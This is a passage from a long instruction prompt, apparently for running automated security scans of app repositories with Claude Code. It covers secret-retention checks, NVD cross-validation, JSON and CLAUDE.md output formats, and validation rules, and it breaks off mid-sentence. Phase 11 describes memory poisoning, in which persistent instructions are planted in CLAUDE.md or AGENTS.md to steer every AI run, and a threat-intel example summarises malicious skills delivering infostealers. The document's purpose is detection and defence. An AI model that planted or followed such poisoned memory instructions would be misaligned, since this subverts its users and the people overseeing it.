**DELETION IS NOT REMEDIATION (v7.6, BLOCKING).** For every Phase 7 hit, also count copies retained by
Claude Code's own version history, then report them with the finding:

Count copies of **this** secret, not of the class — otherwise the number is meaningless. Prefer a
**non-secret anchor** that travels with it (the endpoint URL, the env var name, the rule text), so the
credential itself never enters a command line or a shell history:

```bash
# PREFERRED — anchor on something adjacent and non-secret
ANCHOR='budget.example.com/api/send-report'      # or 'CRON_SECRET', or the allow-rule prefix
printf 'file-history copies: %s\n' "$(grep -rlF "$ANCHOR" ~/.claude/file-history/ 2>/dev/null | wc -l)"

# FALLBACK — only if no anchor exists. Assign, never echo; report the COUNT only.
SECRET="$(cat)"   # paste the value on stdin, Ctrl-D; keeps it out of argv and shell history
printf 'file-history copies: %s\n' "$(grep -rlF "$SECRET" ~/.claude/file-history/ 2>/dev/null | wc -l)"
unset SECRET

du -sh ~/.claude/file-history/ 2>/dev/null
ls ~/.claude/file-history/ 2>/dev/null | wc -l
```

Report the count and the directory size. **Never print a matching line, a file path's contents, or the
value** (the existing Phase 7 rule applies unchanged).

On the app that produced this rule, the token survived in **9 `file-history/` snapshots** (97 dirs,
113 MB, months deep) after the allow-rule was deleted. `file-history/` is plaintext and readable by any
skill, hook, or injected instruction, exactly like the file it snapshotted.

The flag text MUST state: **the credential must be ROTATED at its issuer; removing it from the config
file does not revoke it and does not clear the history copies.** Never mark such a flag Resolved on the
strength of a deletion — resolution requires evidence the old credential is rejected (e.g. the endpoint
returning 401 to it).

### Phase 8: Claude Code version check

```bash
claude --version 2>/dev/null || cat ~/.claude/package.json 2>/dev/null | python3 -c "import json,sys; print(json.load(sys.stdin).get('version','unknown'))"
```

Compare against `minimum_safe_versions['claude-code']`. If less, → P1 flag, `ai-claude-version-stale`.

### Phase 9: Global output — `data/ai-tool-intel.js`

In BATCH MODE only, write the global findings to `<App-Screener-repo>/data/ai-tool-intel.js`. Replace content between markers `<!-- AI_INTEL:AUTO:START -->` and `<!-- AI_INTEL:AUTO:END -->` (or create the file if missing).

The file format:

```javascript
// AI Tool Supply Chain Intelligence — generated by security-scan-prompt v6.2
// Source: https://github.com/FlorianBruniaux/claude-code-ultimate-guide
// Do not edit between AUTO markers.
window.AI_TOOL_INTEL = /* <!-- AI_INTEL:AUTO:START --> */ {
  scannedAt: "YYYY-MM-DD",
  threatDb: {
    version: "2.15.0",
    updated: "2026-04-24",
    daysOld: 1,
    stale: false,
    sourceUrl: "https://github.com/FlorianBruniaux/claude-code-ultimate-guide/blob/main/examples/commands/resources/threat-db.yaml"
  },
  claudeCode: {
    version: "x.y.z",
    minimumSafe: "2.1.34",
    upToDate: true
  },
  installed: {
    skills: 50,
    plugins: 8,
    mcpServers: 6,
    hooks: 12
  },
  flags: [
    // Same flag schema as per-project flags. These are GLOBAL — not tied to a project.
    // { text, severity, category, confidence, exploit?, fix? }
  ],
  topCampaigns: [
    // From threat-db campaigns[]. Cap at 5 most recent or highest-impact.
    { name: "ClawHavoc", source: "Koi/Bitdefender", date: "2026-02-01", skillsCount: 1184, summary: "Malicious skills delivering Atomic Stealer + Windows infostealers via fake prerequisites and base64 payloads" }
  ],
  recentCves: [
    // From cve_database, filter to those affecting tools you have installed OR severity=critical, last 90 days.
    // { id, component, severity, fixedIn, summary }
  ],
  topAttackTechniques: [
    // From attack_techniques[], 3-5 most relevant ones.
    // { id, name, description, mitigation }
  ]
} /* <!-- AI_INTEL:AUTO:END --> */;
```

Write to `<watchtowerRoot>/data/ai-tool-intel.js` where `<watchtowerRoot>` is set in `watchtower.config.json`. Create the `data/` directory if missing.

After writing, append a line to the scan summary: `"AI tool intel written to data/ai-tool-intel.js — N global flags, threat DB age D days"`.

### Phase 10: NVD cross-validation (added in v6.3)

Cross-check every `ai-mcp-cve` flag (and every installed MCP/skill/plugin package by name) against the NIST National Vulnerability Database. The community threat-db is single-maintainer and may be stale, wrong, or incomplete; NVD is the authoritative CVE registry and corrects all three. Phase 10 runs after Phases 2-9 produce a candidate flag list, then enriches or contradicts those findings with NVD data.

**API endpoint (no auth required for low volume):**
```
https://services.nvd.nist.gov/rest/json/cves/2.0
```

Rate limits without an API key: 5 requests / 30 seconds. With a free API key (instant signup at https://nvd.nist.gov/developers/request-an-api-key), 50 / 30 seconds. If `~/.claude/.env` contains `NVD_API_KEY=...`, send it as the `apiKey` request header (as the curl examples below do — NVD API 2.0 takes the key as a header, not a query param).

#### Step A: Confirm each `ai-mcp-cve` flag against NVD by CVE ID

For every flag emitted in Phase 2 with category `ai-mcp-cve`, query NVD:

```bash
CVE_ID="CVE-2025-49596"
curl -s "https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=${CVE_ID}" \
  ${NVD_API_KEY:+-H "apiKey: $NVD_API_KEY"}
```

Compare the NVD response to the threat-db record:
- **NVD-confirmed (no disagreement):** The CVE exists in NVD with matching component name and the threat-db `fixed_in` is consistent with NVD's `versionEndExcluding` from the matching CPE configuration. Annotate the original flag with `nvd: { confirmed: true, cvss: <score>, fetchedAt: <iso-date> }`. No new flag.
- **NVD severity drift:** NVD's CVSS base score differs from threat-db's `severity` mapping by more than one tier (e.g., threat-db says "high" but NVD CVSS is 9.4 → critical). Update the flag's severity to match NVD and append `"NVD CVSS: {score} ({severity})"` to the flag text.
- **Disagreement on fixed version:** NVD `versionEndExcluding` differs from threat-db `fixed_in`. Emit an additional flag with category `ai-mcp-cve-disagreement`, severity `P3`, text `"Threat-db says {pkg} fixed in {threat-db version}, NVD says {nvd version}. Verify which is current."`, fix `"Cross-check vendor advisory; pin to the higher of the two versions to be safe."`. Confidence 0.85.
- **CVE not found in NVD:** Threat-db references a CVE ID that NVD doesn't return. Could be a reservation that was rejected, or threat-db typo. Emit `ai-mcp-cve-disagreement` P3, text `"Threat-db references {CVE-ID} but NVD has no record. Possibly retracted or unassigned."`. Confidence 0.7.

#### Step B: Discover NVD-only CVEs for installed packages

For each installed MCP package, skill author, or plugin name that the threat-db scan did NOT flag, do a keyword search on NVD over the last 365 days:

```bash
PKG="mcp-inspector"
LAST_YEAR=$(date -u -d '365 days ago' +'%Y-%m-%dT%H:%M:%S.000')
curl -s "https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch=${PKG}&keywordExactMatch&pubStartDate=${LAST_YEAR}&pubEndDate=$(date -u +'%Y-%m-%dT%H:%M:%S.000')" \
  ${NVD_API_KEY:+-H "apiKey: $NVD_API_KEY"}
```

For each CVE returned, check if the installed version falls within the affected range (`versionStartIncluding`/`versionEndExcluding` from the matching CPE configuration). If yes → emit a new flag:
- category: `ai-mcp-cve-nvd-only`
- severity: P1 if NVD CVSS >= 9.0, P2 if >= 7.0, P3 otherwise
- text: `"NVD has {CVE-ID} affecting {pkg} {version-range} (CVSS {score}) — not in community threat-db. {short description}."`
- fix: derived from NVD references or "Update to ≥ {versionEndExcluding}"
- exploit: NVD description
- confidence: 0.9

Skip results where the CPE doesn't actually match the installed package (NVD keyword search returns lots of partial matches — match on `cpe:2.3:a:*:{exact-pkg-name}:*` to avoid false positives).

#### Step C: Track cross-check summary

After Phases A and B complete, record an aggregate to the global `ai-tool-intel.js` output:

```javascript
crossCheck: {
  source: "NVD",
  ranAt: "2026-04-25T...",
  totalChecked: 12,        // ai-mcp-cve flags re-resolved
  confirmed: 10,           // NVD agreed with threat-db
  disagreements: 1,        // ai-mcp-cve-disagreement flags emitted
  nvdOnly: 1,              // ai-mcp-cve-nvd-only flags emitted
  errors: 0,               // network failures or rate-limit hits
  apiKey: false            // whether NVD_API_KEY was set
}
```

#### Step D: Failure handling

- If NVD is unreachable or rate-limits us → fall back to threat-db only, emit a P3 flag with category `ai-threat-db-stale` text `"NVD cross-validation failed ({reason}) — falling back to community threat-db only. Verify critical findings manually."`. Set `crossCheck.errors` to the count.
- Network timeouts: 10 seconds per request, 1 retry with exponential backoff.
- Always emit the original threat-db flags even if NVD fails — never drop a finding because cross-validation didn't complete.

#### Throttling

For the unauthenticated rate limit (5/30s), insert a 6-second sleep between NVD calls. With an API key, no throttle needed. The scan runs once per cycle so a slow Phase 10 doesn't block per-project agents.

### Phase 11: Memory file hash drift detection (v6.5 addition)

Memory poisoning (threat-db attack technique T002, T027) plants persistent instructions in CLAUDE.md / MEMORY.md / AGENTS.md that survive sessions and influence every Claude run. Phase 5 already greps for prompt-injection language, but a sophisticated attacker uses subtle phrasing that grep won't catch. Hash-based drift detection is the second layer.

Windows note (v6.9): `~/.claude/` resolves to `%USERPROFILE%\.claude\`. Run the hash commands from Git Bash (where `sha256sum` and `~` both work), or use `Get-FileHash -Algorithm SHA256` in PowerShell.

#### Step A: Compute current hashes

```bash
# Global memory files
for f in ~/.claude/CLAUDE.md ~/.claude/MEMORY.md ~/.claude/SOUL.md ~/.claude/AGENTS.md; do
  if [ -f "$f" ]; then
    sha256sum "$f" | cut -d' ' -f1
  fi
done

# Per-project CLAUDE.md hand-curated portion (outside SCAN:AUTO markers)
# For each project: extract lines BEFORE <!-- SCAN:AUTO:START --> and AFTER <!-- SCAN:AUTO:END -->,
# concat them, then hash. The SCAN:AUTO block changes every scan by design, so exclude it.
```

#### Step B: Compare against prior cycle

Read the prior `data/ai-tool-intel.js` and extract `memoryFileHashes` from the previous scan. For each file:
- **Hash unchanged**: expected. No flag.
- **Hash changed AND a corresponding git commit exists in `~/.claude/` (if it's a git repo) OR a recent commit exists in the project's repo touching the hand-curated CLAUDE.md sections**: legitimate edit. Log `expected-drift` but no flag.
- **Hash changed AND no corresponding commit**: unexpected drift. Flag `ai-memory-file-drift` severity critical for global memory files, moderate for per-project. Text: "{file} hash changed from {prior-hash[:8]} to {current-hash[:8]} since 2026-MM-DD scan. No corresponding git commit found — possible memory poisoning."
- **First-ever scan (no prior hash)**: record current hash as baseline, no flag.

Note: `~/.claude/` may not be a git repo. In that case, every unexpected hash change is a flag — user must manually confirm legitimacy. Recommend the user `git init ~/.claude/` and commit changes for future provenance.

#### Step C: Record in ai-tool-intel.js

Add a `memoryFileHashes` block to the global output:

```javascript
memoryFileHashes: {
  scannedAt: "2026-05-15",
  global: {
    "CLAUDE.md": { sha256: "abc123...", changedSincePrior: false },
    "MEMORY.md": { sha256: "def456...", changedSincePrior: false }
  },
  perProject: {
    "Example-App": { sha256: "...", changedSincePrior: false },
    "New Maint-App": { sha256: "...", changedSincePrior: true, commitFound: true }
  }
}
```

### Phase 12: LLM API spend-cap inventory (v6.5 addition)

The scan can't read the spend cap setting from Anthropic/OpenAI consoles (no public API exposes it). But it CAN enumerate which apps would burn money if a key leaked, and remind the user to verify caps every cycle.

After Phase 2 (MCP audit) and Phase B (per-project scans), aggregate:
- Every project whose envSecrets list contains `ANTHROPIC_API_KEY`, `OPENAI_API_KEY`, `CLAUDE_API_KEY`, or similar
- Group by provider

Emit ONE Phase A global flag per provider in active use:
- `llm-spend-cap-unverified` severity maintenance. Text: "Anthropic key used in N apps ({list}). Verify spending cap is set in console.anthropic.com/settings/limits. A leaked key with no cap burns up to your account's hard limit."
- Same for OpenAI: `platform.openai.com/account/limits`
- Fix in the flag: a one-line instruction with the direct URL to set the cap.

Note: this is a maintenance-tier flag by design — it doesn't degrade with time, it just shows up every cycle as a reminder until the user marks it `status: "resolved"` (after setting the cap) or `status: "accepted"` (with a comment explaining why no cap is acceptable).

---

## STEP 1D: STANDARDS COMPLIANCE (v7.4 — RUN THE SCRIPT, DO NOT JUDGE)

Portfolio standards (how we do notifications, PWA/install, auth platform) live in the
owner's sync repo at `~/.claude-sync/standards/`. Each is a prose contract with a
machine-readable index at `standards/manifest.json` that expresses its rules as
grep-checkable assertions.

**Compliance here is MEASURED BY A SCRIPT. You do not read the code and form an opinion.**

**Why this rule exists — read it before you decide to be helpful.** Before v7.4, this scan
had no standards check at all, yet `data/apps.js` carried lines like *"follows
NOTIFICATION-STANDARD v0.3"* inside the LLM-written free-prose `integrations` and
`strengths` fields. That claim was **wrong** — the standard's own audit says that app is
PARTIAL, missing installation_id, outbox/retry, and the kill switch. A prose field can
only ever say nice things about what it skimmed; it structurally cannot render a NO. The
scan was reporting compliance it never checked, in a file the owner would reasonably
trust. That is worse than reporting nothing. **Never restate, infer, or summarize a
standards claim in `strengths`, `integrations`, or any prose field — those fields must not
mention a standard's name or version at all. The `standards` key below is the only place
compliance may be reported, and only from script output.**

Run, from the project root:

```
node ~/.claude-sync/standards/check-standards.mjs . --json
```

- **Paste the `standards` array from `results[0].standards` verbatim** into the `standards`
  key of the STEP 2 JSON. Do not reword, re-score, upgrade, or "helpfully" reconcile it
  against what you read in the code.
- The script decides applicability itself. A standard reported `n/a` means it does not
  apply to this app — do not score it.
- Each standard reports `status` (`pass` | `partial` | `fail` | `n/a`), a
  `passed`/`total` count, per-check `evidence` as `file:line`, and an `unknown` list of
  rules that are **not mechanically checkable**. Those unknowns are reported as unknown,
  **never as a pass** — do not fill them in with your own reading.
- A check marked `confidence: "medium"` that FAILS means *investigate*, not *proven broken*.
  Carry that nuance into any flag text.

**If the script is missing, errors, or exits 2:** emit `"standards": null` and add ONE flag
`standards-check-unavailable` (P4) naming the error. **Do NOT substitute your own
assessment.** An honest null is the correct output; a plausible guess is the bug this
section exists to prevent.

**Flag emission from script output** (do not double-report — the `standards` key carries
the detail; flags exist so gaps surface in the normal severity workflow):
- Any standard with `status: "fail"` → ONE flag `standard-violation` (P2), text naming the
  standard id + version + the failed P1 check ids, `fix` = the `summary` of the first
  failed P1 check. Escalate to P1 only when the app's `maintainability.tier` is
  `commercial`.
- Any standard with `status: "partial"` → ONE flag `standard-partial` (P3) naming the
  standard and the failed check ids.
- `status: "pass"` → no flag. Do not emit a congratulatory flag.

---

## STEP 2: JSON OUTPUT (primary deliverable)

Output a JSON block in this exact format:

{
  "name": "project name from package.json",
  "url": "deployed production URL (from vercel.json, CNAME, or package.json homepage) or null if not found",
  "repoUrl": "from git remote -v",
  "repoVisibility": "public or private (from gh repo view)",
  "lastUpdated": "most recent git commit date",
  "scope": "content from CLAUDE.md Scope & Boundaries section, or null if not defined",
  "frontend": "framework, version, UI libraries, CSS approach",
  "backend": "server framework, runtime, or 'None (client-side only)'",
  "dataStorage": "databases, caches, static files, localStorage",
  "integrations": "third-party APIs and services",
  "auth": "auth method (Google Auth, Firebase Auth, PIN, none, etc.)",
  "testing": "test frameworks and coverage (e.g. 'Playwright 1.58.2 (11 Chromium smoke tests)', 'Vitest + React Testing Library', 'Jest (47 unit tests)') or 'None'",
  "hosting": "deployment platform from config or vercel.json etc.",
  "strengths": "ONE concrete, verified sentence on what this codebase does well — name specific mechanisms found during the scan (e.g. 'Signature-verified Stripe webhooks, RLS enforced on every queried table, Playwright specs cover auth + checkout'). Never generic praise; only what the scan actually confirmed. This tells a future refactor what NOT to break.",
  "envSecrets": ["list of env variable names needed, e.g. SUPABASE_URL, OPENAI_API_KEY"],
  "flags": [
    {
      "text": "human-readable description",
      "severity": "P1|P2|P3|P4",
      "category": "category-key",
      "confidence": 0.95,
      "owasp": "A05",
      "exploit": "Concrete attack scenario (required for P1/P2, omit for P3/P4)",
      "fix": "Specific remediation step (required for P1/P2, optional for P3/P4)"
    }
  ],
  "securityPosture": {
    "headers": {
      "csp": "Content-Security-Policy header configuration found, or 'missing'",
      "hsts": "Strict-Transport-Security found, or 'missing'",
      "xContentType": "X-Content-Type-Options found, or 'missing'",
      "xFrameOptions": "X-Frame-Options found, or 'missing'",
      "referrerPolicy": "Referrer-Policy found, or 'missing'"
    },
    "cookies": {
      "httpOnly": "true/false — auth cookies use httpOnly flag",
      "secure": "true/false — auth cookies use secure flag",
      "sameSite": "Strict/Lax/None or 'not set'"
    },
    "xssVectors": {
      "dangerouslySetInnerHTML": 0,
      "innerHTML": 0,
      "eval": 0,
      "documentWrite": 0
    },
    "envExposure": ["list of NEXT_PUBLIC_/VITE_ vars that may expose sensitive data"],
    "sqlInjection": "parameterized queries used / raw SQL found / N/A (NoSQL)",
    "csrfProtection": "token validation found / missing / N/A (no forms)",
    "fileUpload": "type and size validation found / missing / N/A (no uploads)"
  },
  "dataIntegrity": {
    "foreignKeys": "describe foreign key constraints found in migrations/schema, or 'none found'",
    "auditLog": "describe any audit/changelog table or trigger, or 'none — no audit trail on data changes'",
    "mutationChecks": "describe any pattern that checks Supabase/Firestore write results for silent failures, or 'none — silent RLS/rules failures possible'",
    "computedColumns": "list any PostgreSQL GENERATED ALWAYS AS columns or Firestore computed fields, or 'none — calculations done in JavaScript only'",
    "periodLocking": "describe any mechanism that prevents edits to closed/past periods, or 'none'",
    "immutableRecords": "describe any tables with no UPDATE/DELETE policies (append-only by design), or 'none'"
  },
  "inputFlows": [
    {
      "source": "URL query param ?redirect=",
      "sink": "window.location.href redirect",
      "sanitized": false,
      "flag": "open-redirect"
    }
  ],
  "sessionSecurity": {
    "tokenStorage": "localStorage | httpOnly cookie",
    "jwtVerification": "server-side verified | client-decode only | N/A",
    "tokenExpiration": "enforced | not enforced | N/A",
    "refreshRotation": "rotated | not rotated | N/A",
    "logoutInvalidation": "server-side | client-only | N/A",
    "sessionFixation": "regenerated on login | not regenerated | N/A"
  },
  "cicdSecurity": {
    "hasWorkflows": true,
    "unpinnedActions": 0,
    "pullRequestTarget": false,
    "scriptInjection": false,
    "codeownersProtected": false
  },
  "llmSecurity": {
    "usesAI": false,
    "promptInjectionRisk": "none | low | high",
    "outputSanitized": true,
    "costLimiting": "present | missing | N/A",
    "toolCallValidation": "present | missing | N/A"
  },
  "webhookSecurity": {
    "webhookEndpoints": 0,
    "signatureVerified": 0,
    "unverified": 0
  },
  "multiTenant": {
    "isMultiTenant": false,
    "tenantIdField": "org_id | user_id | team_id | N/A",
    "tenantIdSource": "session-derived | request-param | mixed | N/A",
    "routesChecked": 0,
    "routesWithClientTenantId": 0
  },
  "errorSanitization": {
    "routesChecked": 0,
    "routesLeakingDetails": 0,
    "leakingFiles": []
  },
  "serverlessCompat": {
    "isServerless": false,
    "platform": "Vercel | Netlify | Lambda | Cloud Functions | N/A",
    "inMemoryStateFound": 0,
    "details": []
  },
  "routeConsistency": {
    "routesSampled": 0,
    "authPatternConsistent": true,
    "errorPatternConsistent": true,
    "validationPatternConsistent": true,
    "inconsistencies": []
  },
  "supplyChain": {
    "envTrackedByGit": [],
    "prodDepsWithInstallScripts": []
  },
  "deployedSurface": {
    "scanned": true,
    "url": "https://example.com",
    "deployedHeaders": {
      "csp": "full header value or 'missing'",
      "hsts": "full header value or 'missing'",
      "xContentType": "nosniff or 'missing'",
      "xFrameOptions": "DENY/SAMEORIGIN or 'missing'",
      "referrerPolicy": "value or 'missing'",
      "permissionsPolicy": "value or 'missing'",
      "corsOrigin": "specific origin / * / not set",
      "serverHeader": "header value or 'not disclosed'"
    },
    "headerMismatches": ["list of headers configured in source but not served in production"],
    "authProvider": {
      "provider": "Clerk / Supabase / Firebase / Auth0 / NextAuth / none",
      "version": "SDK version if detectable",
      "passwordPolicy": {
        "minLength": 8,
        "requireUppercase": false,
        "requireNumbers": false,
        "requireSpecialChar": false,
        "hibpCheck": false,
        "strength": "weak / moderate / strong"
      },
      "captchaEnabled": false,
      "enumerationProtection": false,
      "mfaEnforced": false,
      "mfaMethods": ["phone_code"],
      "lockout": {
        "maxAttempts": 100,
        "durationMinutes": 60
      },
      "signUpMode": "public / restricted / invite-only",
      "socialProviders": ["list of enabled OAuth providers"]
    },
    "infoLeakage": {
      "healthEndpoint": "exposed with DB details / exposed minimal / not found / protected",
      "sentryDSN": "found in page source / not found",
      "buildManifest": "exposed (N static + N dynamic routes) / not found",
      "serverVersion": "disclosed via Server header / not disclosed"
    },
    "securityTxt": "present / missing",
    "robotsTxt": "present / missing / misconfigured"
  },
  "metrics": {
    "totalLines": 0,
    "linesByType": { ".jsx": 0, ".ts": 0, ".tsx": 0, ".js": 0, ".css": 0 },
    "components": 0,
    "pages": 0,
    "apiRoutes": 0,
    "largestFiles": [{ "path": "src/App.jsx", "lines": 0 }],
    "filesOver500Lines": []
  },
  "formatting": {
    "prettierConfigFound": true,
    "prettierClean": true,
    "filesNeedingFormat": 0,
    "_note": "filesNeedingFormat MUST equal the integer N from `prettier --check` output 'Code style issues found in N files'. If prettierClean is true, filesNeedingFormat must be 0. Do not estimate this value — it is deterministic."
  },
  "structure": {
    "folderMap": "top 2 levels of project structure",
    "dataFlow": "where data comes from, how it moves through the app, where it renders",
    "externalCalls": ["list every external API call and what triggers it"],
    "sharedUtils": ["lib/, utils/, helpers/ files and what they do"],
    "duplication": ["any obvious code duplication across files"]
  },
  "standards": [
    {
      "id": "notification",
      "version": "0.4",
      "status": "pass|partial|fail|n/a",
      "passed": 5,
      "total": 8,
      "checks": [
        { "id": "installation-identity", "tenet": "2.1", "severity": "P1", "confidence": "high", "pass": true, "evidence": "src/lib/actions/fcm.ts:28", "summary": "..." }
      ],
      "unknown": ["rules that are not mechanically checkable — reported as unknown, NEVER as a pass"]
    }
  ],
  "_standardsNote": "STEP 1D. VERBATIM from `node ~/.claude-sync/standards/check-standards.mjs . --json` (results[0].standards). NEVER hand-authored, re-scored, or inferred from reading the code — that is exactly how apps.js came to claim a PARTIAL app was compliant. null if the script is unavailable."
}

Rules:
- Only include what you actually find in the code, don't guess
- For envSecrets, list the variable NAMES only, not values
- If something isn't present, use null or []
- No explanation, just the JSON
- Every flag MUST be an object with text, severity, category, and confidence fields (see FLAG OUTPUT RULES)
- `standards` is script output, pasted verbatim (STEP 1D) — it is the ONLY place standards compliance may be stated. Never mention a standard's name or version in `strengths`, `integrations`, or any other prose field.

---

## STEP 3: CLAUDE.md GENERATION

After producing the JSON output, update or create a CLAUDE.md file in the project root.

### MERGE RULES:

**Case 1 — No CLAUDE.md exists:**
Create a new CLAUDE.md and supporting doc structure:

**CLAUDE.md:**
```
# {Project Name}

{One-line description from scan}

> End-of-session protocol: see bottom of this file.

## Active Work

- **Last session ({today's date}):** Security scan run. Initial CLAUDE.md created.
- **Current focus:** {leave blank for user to fill}
- **Next:** Review scan findings and address any P1/P2 flags.

<!-- SCAN:AUTO:START — Generated by security-scan-prompt v7.1. Do not edit this section manually. -->

## Tech Stack

| Layer | Tech |
|---|---|
| Frontend | {REQUIRED: framework + version + UI libs} |
| Backend | {REQUIRED: server framework + runtime, or "None (client-side only)"} |
| Data | {REQUIRED: databases/caches/storage, or "None"} |
| Auth | {REQUIRED: method, or "None"} |
| Hosting | {REQUIRED: platform} |
| Testing | {REQUIRED: framework + test count, or "None"} |
| Analytics | {optional: include row only if detected} |
| Integrations | {optional: third-party APIs if detected} |

## Architecture

### Folder Structure
{REQUIRED: top 2 levels in a fenced code block. Exclude node_modules/.next/dist/.git/build.}

### Key Files
{REQUIRED: list with one-line descriptions, or "_None — single-file app_" with reason.}

### Data Flow
{REQUIRED: one paragraph: source → transform → render. Never omit this subsection.}

### External API Calls
{REQUIRED: each call with URL pattern + HTTP method + trigger event. If none: "_None_".}

## Environment Variables

{REQUIRED: list grouped by service, or "None — {one-line reason, e.g. 'fully static, no secrets'}". NEVER omit this top-level heading.}

## Security Notes

### Active Flags
| Severity | Category | Confidence | Description |
|----------|----------|------------|-------------|
{rows from scan; if no flags, replace the table body with the literal text "_None_" on its own line.}

### Watch List (confidence < 0.8)
{list, or "_None_"}

### Accepted Risks
{list with justification, or "_None_"}

### Resolved
{list with dates, or "_None_"}

## Guardrails

### Universal (apply to all projects)
{REQUIRED: exactly 9 numbered items, copied verbatim from GUARDRAILS RULES below. Never fewer than 9.}

### Project-Specific
{REQUIRED: derived from active flags. If none apply: "_None — no project-specific issues_".}

## Deployed Surface
{REQUIRED if a production URL was detected in STEP 1 or STEP 1B: list verified HTTP headers, CORS posture, /.well-known/security.txt presence, etc. If no URL was detected: "_Not deployed_".}

## Strengths

{REQUIRED: one sentence, copied from the STEP 2 `strengths` field — concrete, verified, names specific mechanisms. Never generic praise.}

## Dev Commands

{REQUIRED: generated from package.json scripts — list each script name with its command in a fenced bash block (e.g. `npm run dev`, `npm run build`, `npm test`). Machine-written every scan so it can never go stale. If the project has no package.json: "_No package.json — not an npm project._"}

## Metrics

- **Total lines:** {N, excluding node_modules/.next/dist/build/package-lock.json}
- **Components:** {N} | **Pages:** {N} | **API routes:** {N}
- **Files over 500 lines:** {list with line counts, or "_None_"}
- **Repo:** {URL or "Local-only"} ({PUBLIC/PRIVATE/unknown})
- **Production URL:** {URL, or "_Not deployed_"}
- **Last commit scanned:** {YYYY-MM-DD} ({short SHA})
- **Scan prompt version:** v7.1

<!-- SCAN:AUTO:END -->

## Auth

<!-- Auth method, roles, session handling. Filled from scan if detectable, otherwise leave for user. -->

## API Route Conventions

<!-- The pattern every route follows: auth middleware, validation, error handling. -->

## Testing
{filled from scan if test infrastructure detected: framework, test count, how to run}

<!-- NOTE (v7.0): Dev Commands now lives INSIDE the SCAN:AUTO block (machine-written
     from package.json scripts every scan). Do not create a hand-written duplicate
     here — one source of truth, and the machine's copy can't go stale. -->

## Deployment
{filled from scan: hosting platform, deploy method, domain}

## Repo Doc Map

| File | What's in it | When to read |
|---|---|---|
| `CLAUDE.md` | This file. Architecture, conventions, guardrails. | Auto-loaded every session |
| `TECH-DEBT.md` | Prioritized issues from security scan | Before scaling, perf, or refactoring work |
| `SESSION-HANDOFF.md` | What happened last session | Start of every session for continuity |
| `PROJECT-LOG.md` | Append-only decision/milestone history | When investigating "why did we do X this way" |
| `CHANGELOG.md` | User-facing version history | When shipping a version bump |
| `README.md` | Public repo readme | When updating public-facing project info |

## Session Maintenance Protocol

At the end of every substantive session — when the user wraps up, switches topics, or completes a major milestone — do this:

1. **Review the session.** Identify: new conventions, decisions made, gotchas discovered, "don't do X" / "always do Y" guidance, stale content in this file.
2. **Propose specific edits** to CLAUDE.md (and TECH-DEBT.md if relevant). Show the diff with reasoning. **Always update the Active Work section** — even if nothing else in this file changed, Active Work must reflect the current session.
3. **Wait for approval.** "Yes" or "approved" means apply all edits. The user can also edit your proposal inline.
4. **Be ruthless about signal-to-noise.** One-off details don't get canonized. When in doubt, leave it out.
5. **Every ~10 sessions or when this file exceeds ~300 lines**, propose a consolidation pass — tighten, deduplicate, delete stale sections.

**Triggers:** User says "done"/"wrapping up"/"good for now", switches to unrelated topic, major milestone completes, 20+ exchanges without a checkpoint.

Do not ask permission to run this protocol. Just run it.
```

**Also create these supporting files if they don't exist:**

**SESSION-HANDOFF.md:**
```
# Session Handoff — {today's date}

## What was done this session
- Initial security scan run

## Where to pick up next
- Review scan findings in CLAUDE.md
```

**PROJECT-LOG.md:**
```
# Project Log

> Append-only log of major decisions, milestones, research findings, and data sources.
> New entries go at the TOP. Don't edit old entries.
> Format: `## YYYY-MM-DD — Short title`

---

## {today's date} — Initial security scan

**What:** First security scan and CLAUDE.md setup.

**Details:** Scan prompt v6.0. See CLAUDE.md Security Notes for findings.
```

**TECH-DEBT.md** (only create if scan produces P3/P4 flags):
```
# Tech Debt

> Prioritized list of scaling, security, and quality issues.
> Updated by the CLAUDE.md session maintenance protocol.
> Items move up/down tiers as context changes. Delete when fixed.

---

## Ship-Blockers
{P1/P2 flags from scan, if any}

## Should-Fix
{P3 flags from scan}

## Quality-of-Life
{P4 flags from scan}
```

**Case 2 — CLAUDE.md exists WITH `<!-- SCAN:AUTO:START` marker:**
- Replace everything between `<!-- SCAN:AUTO:START` and `<!-- SCAN:AUTO:END -->` (inclusive of marker lines) with fresh auto-generated content (including fresh markers)
- Update the project name and description line above the markers if they changed
- Do NOT touch anything outside the markers — preserve all manual sections exactly as they are

**Case 3 — CLAUDE.md exists WITHOUT markers (legacy hand-written file):**
- Read all existing content
- Create new file with:
  - Project name and description at top
  - Full auto-generated section with markers
  - Then: `## Project Notes (preserved from original CLAUDE.md)`
  - Then: all original CLAUDE.md content, indented under that heading
- This preserves every line of hand-written content while adding scan data

After writing/updating CLAUDE.md, proceed to STEP 4 to validate the output before reporting success.

---

## STEP 4: VALIDATE OUTPUT (BLOCKING)

After writing CLAUDE.md, read the file back and confirm the SCAN:AUTO block contains every required heading in this order:

1. `## Tech Stack` — table with rows for Frontend / Backend / Data / Auth / Hosting / Testing at minimum
2. `## Architecture` containing `### Folder Structure`, `### Key Files`, `### Data Flow`, `### External API Calls` (all four subheadings present, none omitted)
3. `## Environment Variables` — heading present even when there are none (use "None — {reason}")
4. `## Security Notes` containing `### Active Flags`, `### Watch List (confidence < 0.8)`, `### Accepted Risks`, `### Resolved` — all four subheadings present, use `_None_` where empty
5. `## Guardrails` containing `### Universal (apply to all projects)` with exactly 9 numbered items copied from GUARDRAILS RULES, and `### Project-Specific`
6. `## Deployed Surface` — heading present (use "_Not deployed_" if no URL)
7. `## Strengths` — heading present with exactly one non-empty sentence (v7.0 addition)
8. `## Dev Commands` — heading present, generated from package.json scripts (or the no-package.json placeholder) (v7.0 addition)
9. `## Metrics` — bullet list with all 7 lines (Total lines, Components/Pages/API routes, Files over 500 lines, Repo, Production URL, Last commit scanned, Scan prompt version)

If ANY required heading is missing, ANY subheading is omitted, OR the Universal Guardrails list does not contain exactly 9 numbered items, re-emit the entire SCAN:AUTO block from scratch — do not patch. Do not output success until the block is structurally complete.

After successful validation, output exactly two lines:
```
CLAUDE.md updated
STRUCTURE: PASS
```
(or "CLAUDE.md created" for new files). The `STRUCTURE: PASS` token is what the orchestrating SKILL checks for in Phase B.5 — without it, the project is queued for re-scan.

---

## SCAN INTEGRITY RULES (v7.5, 2026-08-01 — BLOCKING)

Twelve project owners audited a full v7.5 cycle against their own code. Every rule below
comes from a defect they found in the SCAN, not in their apps. Several describe ways this
scan made a finding look *safer* than it was, damaged a repo, or destroyed its own record.
Read this section before STEP 1.

### I1. NEVER bound severity on an ABSENCE you inferred from the repo

**Presence claims degrade gracefully; absence claims do not.**

A scan wrote: *"there is no UPDATE and no DELETE policy on `storage.objects` anywhere in the
